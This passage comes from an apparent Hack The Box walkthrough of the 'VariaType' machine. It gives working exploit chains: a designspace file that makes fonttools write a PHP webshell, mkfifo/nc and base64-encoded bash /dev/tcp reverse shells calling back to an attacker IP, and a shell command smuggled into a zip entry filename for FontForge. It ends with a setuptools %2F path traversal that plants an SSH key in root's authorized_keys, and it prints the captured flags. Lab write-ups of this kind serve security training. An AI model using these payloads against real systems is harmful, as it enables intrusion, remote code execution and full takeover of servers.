?&gt;]]]]&gt;&lt;![CDATA[&gt;]]&gt;<span class="tag">&lt;/<span class="name">labelname</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">labelname</span> <span class="attr">xml:lang</span>=<span class="string">&quot;fr&quot;</span>&gt;</span>Regular<span class="tag">&lt;/<span class="name">labelname</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">axis</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">axes</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">sources</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">source</span> <span class="attr">filename</span>=<span class="string">&quot;source-light.ttf&quot;</span> <span class="attr">name</span>=<span class="string">&quot;Light&quot;</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">location</span>&gt;</span><span class="tag">&lt;<span class="name">dimension</span> <span class="attr">name</span>=<span class="string">&quot;Weight&quot;</span> <span class="attr">xvalue</span>=<span class="string">&quot;100&quot;</span>/&gt;</span><span class="tag">&lt;/<span class="name">location</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">source</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">source</span> <span class="attr">filename</span>=<span class="string">&quot;source-regular.ttf&quot;</span> <span class="attr">name</span>=<span class="string">&quot;Regular&quot;</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">location</span>&gt;</span><span class="tag">&lt;<span class="name">dimension</span> <span class="attr">name</span>=<span class="string">&quot;Weight&quot;</span> <span class="attr">xvalue</span>=<span class="string">&quot;400&quot;</span>/&gt;</span><span class="tag">&lt;/<span class="name">location</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">source</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">sources</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">variable-fonts</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">variable-font</span> <span class="attr">name</span>=<span class="string">&quot;MyFont&quot;</span> <span class="attr">filename</span>=<span class="string">&quot;/var/www/portal.variatype.htb/public/files/shell.php&quot;</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">axis-subsets</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">axis-subset</span> <span class="attr">name</span>=<span class="string">&quot;Weight&quot;</span>/&gt;</span></span><br><span class="line">      <span class="tag">&lt;/<span class="name">axis-subsets</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">variable-font</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">variable-fonts</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">designspace</span>&gt;</span></span><br></pre></td></tr></table></figure></div>
+
+<h3 id="Uploading-and-Getting-RCE"><a href="#Uploading-and-Getting-RCE" class="headerlink" title="Uploading and Getting RCE"></a>Uploading and Getting RCE</h3><p>We upload the designspace and both master fonts to the generator:</p>
+<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">curl -s -X POST http://variatype.htb/tools/variable-font-generator/process \</span><br><span class="line">  -F <span class="string">&quot;designspace=@/tmp/malicious.designspace&quot;</span> \</span><br><span class="line">  -F <span class="string">&quot;masters=@/tmp/source-light.ttf&quot;</span> \</span><br><span class="line">  -F <span class="string">&quot;masters=@/tmp/source-regular.ttf&quot;</span></span><br></pre></td></tr></table></figure></div>
+
+<p>The server responds with <code>200 OK</code> and the message “Processing completed. Your variable font is ready.” — fonttools has compiled the font and written it to <code>/var/www/portal.variatype.htb/public/files/shell.php</code>.</p>
+<p>We verify the webshell works:</p>
+<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">curl -s <span class="string">&quot;http://portal.variatype.htb/files/shell.php&quot;</span> --get --data-urlencode <span class="string">&quot;cmd=id&quot;</span></span><br><span class="line"><span class="comment"># Output (embedded in font binary data): uid=33(www-data) gid=33(www-data) groups=33(www-data)</span></span><br></pre></td></tr></table></figure></div>
+
+<p>The output is mixed with binary font data (since the file is actually a compiled font with PHP embedded in the name table), but the command output is clearly visible. We have confirmed RCE as <code>www-data</code>.</p>
+<h3 id="Upgrading-to-a-Reverse-Shell"><a href="#Upgrading-to-a-Reverse-Shell" class="headerlink" title="Upgrading to a Reverse Shell"></a>Upgrading to a Reverse Shell</h3><p>The webshell works but the output is noisy (mixed with binary). We upgrade to a proper reverse shell using the classic mkfifo&#x2F;nc method:</p>
+<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># On Kali — start a listener:</span></span><br><span class="line">rlwrap nc -lvnp 4444</span><br><span class="line"></span><br><span class="line"><span class="comment"># Trigger the reverse shell via the webshell:</span></span><br><span class="line">curl -s <span class="string">&quot;http://portal.variatype.htb/files/shell.php&quot;</span> --get \</span><br><span class="line">  --data-urlencode <span class="string">&quot;cmd=rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2&gt;&amp;1|nc 10.10.16.163 4444 &gt;/tmp/f&quot;</span></span><br></pre></td></tr></table></figure></div>
+
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">listening on [any] 4444 ...</span><br><span class="line">connect to [10.10.16.163] from (UNKNOWN) [10.129.5.193] 32774</span><br><span class="line">www-data@variatype:~/portal.variatype.htb/public/files$</span><br></pre></td></tr></table></figure></div>
+
+<h2 id="Lateral-Movement-CVE-2024-25081-FontForge-Filename-Injection-www-data-→-steve"><a href="#Lateral-Movement-CVE-2024-25081-FontForge-Filename-Injection-www-data-→-steve" class="headerlink" title="Lateral Movement - CVE-2024-25081: FontForge Filename Injection (www-data → steve)"></a>Lateral Movement - CVE-2024-25081: FontForge Filename Injection (www-data → steve)</h2><h3 id="Local-Enumeration-as-www-data"><a href="#Local-Enumeration-as-www-data" class="headerlink" title="Local Enumeration as www-data"></a>Local Enumeration as www-data</h3><p>With a shell as <code>www-data</code>, we begin standard enumeration:</p>
+<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">ls</span> /home/</span><br><span class="line"><span class="comment"># steve</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">cat</span> /etc/passwd | grep -v nologin | grep -v <span class="literal">false</span></span><br><span class="line"><span class="comment"># root:x:0:0:root:/root:/bin/bash</span></span><br><span class="line"><span class="comment"># steve:x:1001:1001::/home/steve:/bin/bash</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">cat</span> /home/steve/user.txt</span><br><span class="line"><span class="comment"># Permission denied</span></span><br></pre></td></tr></table></figure></div>
+
+<p>Only one real user besides root: <code>steve</code>. We can’t read the flag yet.</p>
+<p>Searching for interesting files, we find a backup of a processing script:</p>
+<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">find /opt -<span class="built_in">type</span> f</span><br><span class="line"><span class="comment"># /opt/variatype/app.py</span></span><br><span class="line"><span class="comment"># /opt/variatype/script.py</span></span><br><span class="line"><span class="comment"># /opt/font-tools/install_validator.py</span></span><br><span class="line"><span class="comment"># /opt/process_client_submissions.bak</span></span><br></pre></td></tr></table></figure></div>
+
+<h3 id="Analyzing-the-Font-Processing-Pipeline"><a href="#Analyzing-the-Font-Processing-Pipeline" class="headerlink" title="Analyzing the Font Processing Pipeline"></a>Analyzing the Font Processing Pipeline</h3><p>The backup script at <code>/opt/process_client_submissions.bak</code> reveals a font processing pipeline:</p>
+<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cat</span> /opt/process_client_submissions.bak</span><br></pre></td></tr></table></figure></div>
+
+<p>Key details from the script:</p>
+<ul>
+<li><strong>Runs as <code>steve</code></strong> (paths point to <code>/home/steve/processed_fonts</code>, <code>/home/steve/logs/</code>, etc.)</li>
+<li><strong>Monitors</strong> <code>/var/www/portal.variatype.htb/public/files/</code> for font files</li>
+<li><strong>Processes</strong> files with extensions: <code>.ttf</code>, <code>.otf</code>, <code>.woff</code>, <code>.woff2</code>, <code>.zip</code>, <code>.tar</code>, <code>.tar.gz</code>, <code>.sfd</code></li>
+<li><strong>Uses FontForge</strong> to validate each file: <code>/usr/local/src/fontforge/build/bin/fontforge -lang=py -c &quot;import fontforge; font = fontforge.open(&#39;$file&#39;)&quot;</code></li>
+<li>Has a filename sanitization regex (<code>^[a-zA-Z0-9._-]+$</code>) but this only applies to files already in the directory — <strong>not to filenames extracted from archives</strong></li>
+</ul>
+<p>The fact that this is a <code>.bak</code> file suggests it’s a backup of an active cron job running the same logic.</p>
+<h3 id="Checking-the-FontForge-Version"><a href="#Checking-the-FontForge-Version" class="headerlink" title="Checking the FontForge Version"></a>Checking the FontForge Version</h3><div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">/usr/local/src/fontforge/build/bin/fontforge --version</span><br><span class="line"><span class="comment"># Version: 20230101</span></span><br><span class="line"><span class="comment"># Based on sources from 2025-12-07 11:44 UTC-D.</span></span><br></pre></td></tr></table></figure></div>
+
+<p>Researching this version reveals <strong>CVE-2024-25081</strong>: FontForge has a command injection vulnerability in its archive extraction handling. When FontForge opens a <code>.zip</code> (or other archive) file, it extracts the contents to a temporary directory and then attempts to process each extracted file. The extracted filenames are passed through shell operations <strong>without sanitization</strong>, meaning a filename containing shell metacharacters like <code>$(command)</code> will be executed.</p>
+<p>The attack path is clear:</p>
+<ol>
+<li>Create a <code>.zip</code> file containing a font file whose <strong>filename</strong> is a shell command</li>
+<li>Place it in the monitored directory (<code>/var/www/portal.variatype.htb/public/files/</code>)</li>
+<li>Wait for the cron job to pick it up</li>
+<li>FontForge extracts the zip → the malicious filename triggers command execution <strong>as <code>steve</code></strong></li>
+</ol>
+<h3 id="Building-the-Exploit-Zip"><a href="#Building-the-Exploit-Zip" class="headerlink" title="Building the Exploit Zip"></a>Building the Exploit Zip</h3><p>We create a zip archive with an embedded reverse shell in the filename. We use base64 encoding to avoid special characters that might break the shell command within the filename:</p>
+<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> zipfile</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line">cmd = <span class="string">&quot;bash -i &gt;&amp; /dev/tcp/10.10.16.163/5555 0&gt;&amp;1&quot;</span></span><br><span class="line">b64 = base64.b64encode(cmd.encode()).decode()</span><br><span class="line">exploit_filename = <span class="string">f&quot;$(echo <span class="subst">&#123;b64&#125;</span>|base64 -d|bash).ttf&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> zipfile.ZipFile(<span class="string">&#x27;/tmp/exploit.zip&#x27;</span>, <span class="string">&#x27;w&#x27;</span>) <span class="keyword">as</span> zipf:</span><br><span class="line">    zipf.writestr(exploit_filename, <span class="string">b&quot;dummy content&quot;</span>)</span><br></pre></td></tr></table></figure></div>
+
+<p>The resulting zip contains a single file named:</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$(echo YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNi4xNjMvNTU1NSAwPiYxCg==|base64 -d|bash).ttf</span><br></pre></td></tr></table></figure></div>
+
+<p>When FontForge extracts this and passes the filename through the shell, <code>$(...)</code> triggers command substitution, which decodes and executes the reverse shell payload.</p>
+<h3 id="Deploying-and-Catching-the-Shell"><a href="#Deploying-and-Catching-the-Shell" class="headerlink" title="Deploying and Catching the Shell"></a>Deploying and Catching the Shell</h3><p>We start a listener on the attacking machine and upload the zip through the existing webshell:</p>
+<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># On Kali — start a listener for the steve shell:</span></span><br><span class="line">rlwrap nc -lvnp 5555</span><br><span class="line"></span><br><span class="line"><span class="comment"># On Kali — serve the exploit zip:</span></span><br><span class="line">python3 -m http.server 8081</span><br><span class="line"></span><br><span class="line"><span class="comment"># Via the www-data webshell — download the zip into the monitored directory:</span></span><br><span class="line">curl -s <span class="string">&quot;http://portal.variatype.htb/files/shell.php&quot;</span> --get \</span><br><span class="line">  --data-urlencode <span class="string">&quot;cmd=curl http://10.10.16.163:8081/exploit.zip \</span></span><br><span class="line"><span class="string">  -o /var/www/portal.variatype.htb/public/files/exploit.zip&quot;</span></span><br></pre></td></tr></table></figure></div>
+
+<p>After approximately 2 minutes, the cron job runs, FontForge extracts the zip file, the malicious filename is evaluated by the shell, and a reverse shell connects back:</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">listening on [any] 5555 ...</span><br><span class="line">connect to [10.10.16.163] from (UNKNOWN) [10.129.5.193] 48768</span><br><span class="line">steve@variatype:/tmp/ffarchive-6539-1$</span><br></pre></td></tr></table></figure></div>
+
+<h3 id="User-Flag"><a href="#User-Flag" class="headerlink" title="User Flag"></a>User Flag</h3><div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cat</span> /home/steve/user.txt</span><br><span class="line">08988171941956f661e473eac88a1bb4</span><br></pre></td></tr></table></figure></div>
+
+<h2 id="Privilege-Escalation-setuptools-PackageIndex-Path-Traversal-steve-→-root"><a href="#Privilege-Escalation-setuptools-PackageIndex-Path-Traversal-steve-→-root" class="headerlink" title="Privilege Escalation - setuptools PackageIndex Path Traversal (steve → root)"></a>Privilege Escalation - setuptools PackageIndex Path Traversal (steve → root)</h2><h3 id="Sudo-Enumeration"><a href="#Sudo-Enumeration" class="headerlink" title="Sudo Enumeration"></a>Sudo Enumeration</h3><p>First thing we check as <code>steve</code>:</p>
+<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo -l</span><br></pre></td></tr></table></figure></div>
+
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">Matching Defaults entries for steve on variatype:</span><br><span class="line">    env_reset, mail_badpass,</span><br><span class="line">    secure_path=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin,</span><br><span class="line">    use_pty</span><br><span class="line"></span><br><span class="line">User steve may run the following commands on variatype:</span><br><span class="line">    (root) NOPASSWD: /usr/bin/python3 /opt/font-tools/install_validator.py *</span><br></pre></td></tr></table></figure></div>
+
+<p>Steve can run a Python script as root without a password. The wildcard (<code>*</code>) means any argument can be passed.</p>
+<h3 id="Analyzing-install-validator-py"><a href="#Analyzing-install-validator-py" class="headerlink" title="Analyzing install_validator.py"></a>Analyzing install_validator.py</h3><div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cat</span> /opt/font-tools/install_validator.py</span><br></pre></td></tr></table></figure></div>
+
+<p>The script is a “Font Validator Plugin Installer” that:</p>
+<ol>
+<li>Takes a single URL argument (must be <code>http://</code> or <code>https://</code>)</li>
+<li>Validates the URL format and rejects URLs with more than 10 forward slashes</li>
+<li>Uses <code>setuptools.package_index.PackageIndex().download()</code> to fetch the URL content and save it locally to <code>/opt/font-tools/validators/</code></li>
+</ol>
+<p>The critical code:</p>
+<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> setuptools.package_index <span class="keyword">import</span> PackageIndex</span><br><span class="line"></span><br><span class="line">PLUGIN_DIR = <span class="string">&quot;/opt/font-tools/validators&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">install_validator_plugin</span>(<span class="params">plugin_url</span>):</span><br><span class="line">    index = PackageIndex()</span><br><span class="line">    downloaded_path = index.download(plugin_url, PLUGIN_DIR)</span><br><span class="line">    logging.info(<span class="string">f&quot;Plugin installed at: <span class="subst">&#123;downloaded_path&#125;</span>&quot;</span>)</span><br></pre></td></tr></table></figure></div>
+
+<h3 id="The-setuptools-Path-Traversal"><a href="#The-setuptools-Path-Traversal" class="headerlink" title="The setuptools Path Traversal"></a>The setuptools Path Traversal</h3><p>The vulnerability lies in how <code>PackageIndex.download()</code> determines the output filename. It parses the URL path to derive a local filename and saves it relative to the specified directory. However, when the URL contains <strong>URL-encoded forward slashes</strong> (<code>%2F</code>), the <code>download()</code> method decodes them during the file write operation, resulting in <strong>path traversal</strong>.</p>
+<p>For example, a URL like:</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://attacker.com/%2Froot%2F.ssh%2Fauthorized_keys</span><br></pre></td></tr></table></figure></div>
+
+<p>Gets decoded to the path <code>/root/.ssh/authorized_keys</code>, and since the script runs as <strong>root</strong> via sudo, the downloaded content is written directly to that location — effectively allowing us to plant an SSH key in root’s home directory.</p>
+<p>The URL slash limit (<code>&gt; 10</code>) is not a problem because <code>%2F</code> is not counted as a forward slash by the <code>url.count(&#39;/&#39;)</code> check — it only counts literal <code>/</code> characters.</p>
+<h3 id="Exploiting-for-Root-Access"><a href="#Exploiting-for-Root-Access" class="headerlink" title="Exploiting for Root Access"></a>Exploiting for Root Access</h3><p>We generate a fresh SSH key pair on the attacking machine:</p>
+<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh-keygen -t ed25519 -f /tmp/rootkey -N <span class="string">&quot;&quot;</span></span><br></pre></td></tr></table></figure></div>
+
+<p>We set up a custom HTTP server that serves the public key for any request path. This is necessary because the <code>download()</code> method requests the exact URL path, and we need it to receive valid SSH key content regardless:</p>
+<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">mkdir</span> -p /tmp/rootserve</span><br><span class="line"><span class="built_in">cp</span> /tmp/rootkey.pub /tmp/rootserve/authorized_keys</span><br><span class="line"></span><br><span class="line"><span class="built_in">cat</span> &gt; /tmp/rootserve/server.py &lt;&lt; <span class="string">&#x27;EOF&#x27;</span></span><br><span class="line">from http.server import HTTPServer, BaseHTTPRequestHandler</span><br><span class="line"></span><br><span class="line">class Handler(BaseHTTPRequestHandler):</span><br><span class="line">    def do_GET(self):</span><br><span class="line">        with open(<span class="string">&#x27;authorized_keys&#x27;</span>, <span class="string">&#x27;rb&#x27;</span>) as f:</span><br><span class="line">            data = f.read()</span><br><span class="line">        self.send_response(200)</span><br><span class="line">        self.send_header(<span class="string">&#x27;Content-Type&#x27;</span>, <span class="string">&#x27;text/plain&#x27;</span>)</span><br><span class="line">        self.send_header(<span class="string">&#x27;Content-Length&#x27;</span>, len(data))</span><br><span class="line">        self.end_headers()</span><br><span class="line">        self.wfile.write(data)</span><br><span class="line"></span><br><span class="line">HTTPServer((&#x27;<span class="number">0.0</span>.<span class="number">0.0</span>&#x27;, <span class="number">8888</span>), Handler).serve_forever()</span><br><span class="line">EOF</span><br><span class="line">cd /tmp/rootserve &amp;&amp; python3 server.py</span><br></pre></td></tr></table></figure></div>
+
+<p>From the <code>steve</code> shell, we run the sudo command with the path-traversal URL. The <code>%2F</code>-encoded slashes cause <code>PackageIndex.download()</code> to write the SSH public key to <code>/root/.ssh/authorized_keys</code> as root:</p>
+<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sudo /usr/bin/python3 /opt/font-tools/install_validator.py \</span><br><span class="line">  <span class="string">&quot;http://10.10.16.163:8888/%2Froot%2F.ssh%2Fauthorized_keys&quot;</span></span><br></pre></td></tr></table></figure></div>
+
+<p>The HTTP server logs the incoming request, confirming the download occurred. The script prints <code>[+] Plugin installed successfully.</code></p>
+<h3 id="Root-Flag"><a href="#Root-Flag" class="headerlink" title="Root Flag"></a>Root Flag</h3><p>We SSH in as root using the planted key:</p>
+<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh -i /tmp/rootkey root@10.129.5.193</span><br></pre></td></tr></table></figure></div>
+
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">root@variatype:~# id</span><br><span class="line">uid=0(root) gid=0(root) groups=0(root)</span><br><span class="line"></span><br><span class="line">root@variatype:~# cat /root/root.txt</span><br><span class="line">105f8e159e96e550f814ce1246d77a70</span><br></pre></td></tr></table></figure></div>
+
+<p>And just like that, we own the box.</p>
+<h2 id="Summary"><a href="#Summary" class="headerlink" title="Summary"></a>Summary</h2><table>
+<thead>
+<tr>
+<th>Step</th>
+<th>Vector</th>
+<th>From → To</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>Enumeration</td>
+<td>Exposed <code>.git</code> directory with hardcoded credentials in commit history</td>
+<td>— → Portal login</td>
+</tr>
+<tr>
+<td>Foothold</td>
+<td>GHSA-768j-98cg-p3fv: fonttools arbitrary file write via designspace <code>filename</code> attribute, combined with PHP payload in font name table</td>
+<td>— → www-data</td>
+</tr>
+<tr>
+<td>User</td>
+<td>CVE-2024-25081: FontForge command injection via crafted filenames inside zip archives processed by a cron job</td>
+<td>www-data → steve</td>
+</tr>
+<tr>
+<td>Root</td>
+<td>Path traversal in <code>setuptools.package_index.PackageIndex.download()</code> via <code>%2F</code>-encoded slashes in a sudo-allowed script</td>
+<td>steve → root</td>
+</tr>
+</tbody></table>
+
+        </div>
+
+        
+            <div class="post-copyright-info px-2 sm:px-6 md:px-8">
+                <div class="article-copyright-info-container">
+    <ul>
+        <li><strong>Title:</strong> Hackthebox: VariaType</li>
+        <li><strong>Author:</strong> Foued SAIDI</li>
+        <li><strong>Created at
+                :</strong> 2026-06-16 22:30:40</li>
+        
+            <li>
+                <strong>Updated at
+                    :</strong> 2026-06-16 22:58:17
+            </li>
+        
+        <li>
+            <strong>Link:</strong> https://kujen5.github.io/2026/06/16/Hackthebox-VariaType/
+        </li>
+        <li>
+            <strong>
+                License:
+            </strong>
+            
+
+            
+                This work is licensed under <a class="license" target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0">CC BY-NC-SA 4.0</a>.
+            
+        </li>
+    </ul>
+</div>
+
+            </div>
+        
+
+        
+
+        
+
+        
+            <div class="article-nav my-8 flex justify-between items-center px-2 sm:px-6 md:px-8">
+                
+                
+                    <div class="article-next border-border-color shadow-redefine-flat shadow-shadow-color-2 rounded-medium px-4 py-2 hover:shadow-redefine-flat-hover hover:shadow-shadow-color-2">
+                        <a class="next"
+                        rel="next"
+                        href="/2026/06/09/Hackthebox-Facts/"
+                        >
+                            <span class="title flex justify-center items-center">
+                                <span class="post-nav-title-item">Hackthebox: Facts</span>
+                                <span class="post-nav-item">Next posts</span>
+                            </span>
+                            <span class="right arrow-icon flex justify-center items-center">
+                                <i class="fa-solid fa-chevron-right"></i>
+                            </span>
+                        </a>
+                    </div>
+                
+            </div>
+        
+
+
+        
+    </div>
+
+    
+        <div class="toc-content-container">
+            <div class="post-toc-wrap">
+    <div class="post-toc">
+        <div class="toc-title">On this page</div>
+        <div class="page-title">Hackthebox: VariaType</div>
+        <ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#Overview"><span class="nav-text">Overview</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Reconnaissance"><span class="nav-text">Reconnaissance</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Web-application-http-variatype-htb"><span class="nav-text">Web application - http:&#x2F;&#x2F;variatype.htb </span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Exposed-git-Repository-Credential-Leak"><span class="nav-text">Exposed .git Repository &amp; Credential Leak</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Foothold-Arbitrary-File-Write-via-fonttools-Designspace-RCE-as-www-data"><span class="nav-text">Foothold - Arbitrary File Write via fonttools Designspace (RCE as www-data)</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#Understanding-the-Font-Generator"><span class="nav-text">Understanding the Font Generator</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Identifying-the-Vulnerability-GHSA-768j-98cg-p3fv"><span class="nav-text">Identifying the Vulnerability (GHSA-768j-98cg-p3fv)</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Crafting-the-Exploit"><span class="nav-text">Crafting the Exploit</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Uploading-and-Getting-RCE"><span class="nav-text">Uploading and Getting RCE</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Upgrading-to-a-Reverse-Shell"><span class="nav-text">Upgrading to a Reverse Shell</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Lateral-Movement-CVE-2024-25081-FontForge-Filename-Injection-www-data-%E2%86%92-steve"><span class="nav-text">Lateral Movement - CVE-2024-25081: FontForge Filename Injection (www-data → steve)</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#Local-Enumeration-as-www-data"><span class="nav-text">Local Enumeration as www-data</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Analyzing-the-Font-Processing-Pipeline"><span class="nav-text">Analyzing the Font Processing Pipeline</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Checking-the-FontForge-Version"><span class="nav-text">Checking the FontForge Version</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Building-the-Exploit-Zip"><span class="nav-text">Building the Exploit Zip</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Deploying-and-Catching-the-Shell"><span class="nav-text">Deploying and Catching the Shell</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#User-Flag"><span class="nav-text">User Flag</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Privilege-Escalation-setuptools-PackageIndex-Path-Traversal-steve-%E2%86%92-root"><span class="nav-text">Privilege Escalation - setuptools PackageIndex Path Traversal (steve → root)</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#Sudo-Enumeration"><span class="nav-text">Sudo Enumeration</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Analyzing-install-validator-py"><span class="nav-text">Analyzing install_validator.py</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#The-setuptools-Path-Traversal"><span class="nav-text">The setuptools Path Traversal</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" 